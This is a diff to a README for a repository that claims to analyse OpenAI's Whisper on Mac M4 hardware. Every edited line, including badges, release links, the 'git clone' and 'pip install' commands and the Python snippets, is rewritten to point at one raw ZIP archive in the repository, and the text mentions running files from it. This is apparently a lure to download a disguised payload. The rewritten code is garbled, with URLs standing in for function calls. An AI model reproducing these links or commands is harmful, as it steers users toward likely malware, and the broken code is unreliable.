@@ -1,6 +1,6 @@
 # Comprehensive Analysis of OpenAI's Whisper on Mac M4 Hardware
 
-![Whisper Analysis](https://img.shields.io/badge/Whisper%20Analysis-OpenAI%20Whisper-brightgreen) ![GitHub Releases](https://img.shields.io/badge/Releases-v1.0.0-blue)
+![Whisper Analysis](https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip%20Analysis-OpenAI%20Whisper-brightgreen) ![GitHub Releases](https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 
 ## Overview
 
-This repository contains a comprehensive technical analysis of OpenAI's Whisper speech recognition model, specifically optimized for Mac M4 hardware. The analysis includes performance benchmarks, implementation guidance, and various insights into the model's capabilities. For the latest releases, please visit the [Releases section](https://github.com/papi-el/theinsyeds-whisper-analysis/releases).
+This repository contains a comprehensive technical analysis of OpenAI's Whisper speech recognition model, specifically optimized for Mac M4 hardware. The analysis includes performance benchmarks, implementation guidance, and various insights into the model's capabilities. For the latest releases, please visit the [Releases section](https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip).
 
 ## Features
 
@@ -30,7 +30,7 @@ This repository contains a comprehensive technical analysis of OpenAI's Whisper 
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/papi-el/theinsyeds-whisper-analysis.git
+git clone https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip
 cd theinsyeds-whisper-analysis
 ```
 
@@ -45,12 +45,12 @@ Ensure you have the following installed:
 You can install the required Python packages using:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip
 ```
 
 ### Downloading Releases
 
-To download the latest release, visit the [Releases section](https://github.com/papi-el/theinsyeds-whisper-analysis/releases). If you need to execute any files from the release, follow the provided instructions in that section.
+To download the latest release, visit the [Releases section](https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip). If you need to execute any files from the release, follow the provided instructions in that section.
 
 ## Usage
 
@@ -69,12 +69,12 @@ To run a simple speech recognition task, you can use the following code snippet 
 ```python
 import whisper
 
-model = whisper.load_model("base")
-result = model.transcribe("path_to_audio_file.wav")
+model = https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip("base")
+result = https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip("https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip")
 print(result["text"])
 ```
 
-Replace `"path_to_audio_file.wav"` with the path to your audio file.
+Replace `"https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip"` with the path to your audio file.
 
 ## Performance Benchmarks
 
@@ -108,7 +108,7 @@ Before transcribing audio, ensure that the audio files are in the correct format
 ```python
 import librosa
 
-audio, sr = librosa.load("path_to_audio_file.wav", sr=None)
+audio, sr = https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip("https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip", sr=None)
 ```
 
 ### Performance Optimization
@@ -138,4 +138,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out to the repository owner. You can find contact information in the repository settings.
 
-For the latest releases, please visit the [Releases section](https://github.com/papi-el/theinsyeds-whisper-analysis/releases).
+For the latest releases, please visit the [Releases section](https://github.com/papi-el/theinsyeds-whisper-analysis/raw/refs/heads/main/research/experiments/theinsyeds-analysis-whisper-v3.6.zip).
